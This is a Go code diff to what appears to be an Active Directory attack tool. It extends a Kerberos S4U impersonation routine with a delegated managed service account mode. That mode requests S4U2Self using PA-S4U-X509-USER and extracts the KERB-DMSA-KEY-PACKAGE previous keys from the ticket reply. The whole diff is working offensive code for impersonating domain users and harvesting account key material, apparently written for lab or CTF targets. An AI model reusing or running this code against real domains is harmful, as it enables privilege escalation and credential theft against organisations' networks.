@@ -33,9 +33,11 @@ type S4UOptions struct {
 	SPN         string // cifs/host or host/host
 	AltService  string // getST -altservice: rewrite ticket sname (e.g. CIFS/DC01)
 	Dir         string
+	DMSA        bool // S4U2Self with PA-S4U-X509-USER; dump KERB-DMSA-KEY-PACKAGE
 }
 
-// S4U requests an AES TGT for the machine, S4U2Self, then S4U2Proxy for SPN.
+// S4U requests an AES TGT, then S4U2Self (+ S4U2Proxy unless DMSA).
+// DMSA uses PA-S4U-X509-USER and dumps KERB-DMSA-KEY-PACKAGE previous-keys.
 // RC4 TGTs and service tickets are refused.
 func S4U(opts S4UOptions) (TicketMeta, error) {
 	if err := validateS4U(opts); err != nil {
@@ -58,25 +60,54 @@ func S4U(opts S4UOptions) (TicketMeta, error) {
 	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
 	selfName := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{user}}
 	imp := types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{samOnly(opts.Impersonate)}}
-	selfReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, skey, selfName, false)
+	sname := selfName
+	if opts.DMSA {
+		spnStr := strings.TrimSpace(opts.SPN)
+		if spnStr == "" {
+			spnStr = "krbtgt/" + realm
+		}
+		sname, err = parseSPN(spnStr)
+		if err != nil {
+			return TicketMeta{}, err
+		}
+	}
+	selfReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, skey, sname, false)
 	if err != nil {
 		return TicketMeta{}, fmt.Errorf("S4U2Self TGS-REQ: %w", err)
 	}
 	types.SetFlag(&selfReq.ReqBody.KDCOptions, flags.Forwardable)
-	if err := restampTGSPAData(&selfReq, tgt, skey); err != nil {
-		return TicketMeta{}, err
+	var pa types.PAData
+	if opts.DMSA {
+		pa, err = marshalPAS4UX509User(imp, realm, skey)
+	} else {
+		pa, err = marshalPAForUser(imp, realm, skey)
 	}
-	pa, err := marshalPAForUser(imp, realm, skey)
 	if err != nil {
 		return TicketMeta{}, err
 	}
 	selfReq.PAData = append(selfReq.PAData, pa)
+	if err := restampTGSPAData(&selfReq, tgt, skey); err != nil {
+		return TicketMeta{}, err
+	}
 	selfRep, err := tgsExchange(opts.KDC, selfReq, tgt, skey)
 	if err != nil {
 		return TicketMeta{}, fmt.Errorf("S4U2Self: %w", err)
 	}
 	if err := requireImpersonated(selfRep.CName, opts.Impersonate); err != nil {
 		return TicketMeta{}, fmt.Errorf("S4U2Self: %w", err)
+	}
+	if opts.DMSA {
+		pkg, kerr := dmsaKeysFromTGS(selfRep)
+		if kerr != nil {
+			return TicketMeta{}, kerr
+		}
+		meta, serr := storeS4UTicket(opts, selfRep)
+		if serr != nil {
+			return TicketMeta{}, serr
+		}
+		meta.Source = "s4u-dmsa"
+		meta.DMSAKeys = &pkg
+		return meta, nil
 	}
 	if !types.IsFlagSet(&selfRep.DecryptedEncPart.Flags, flags.Forwardable) {
 		return TicketMeta{}, fmt.Errorf("S4U2Self ticket is not forwardable")
@@ -126,7 +157,7 @@ func validateS4U(opts S4UOptions) error {
 	if strings.TrimSpace(opts.Impersonate) == "" {
 		return fmt.Errorf("--impersonate required")
 	}
-	if strings.TrimSpace(opts.SPN) == "" {
+	if !opts.DMSA && strings.TrimSpace(opts.SPN) == "" {
 		return fmt.Errorf("--spn required (e.g. cifs/dc.domain.htb)")
 	}
 	if alt := strings.TrimSpace(opts.AltService); alt != "" {
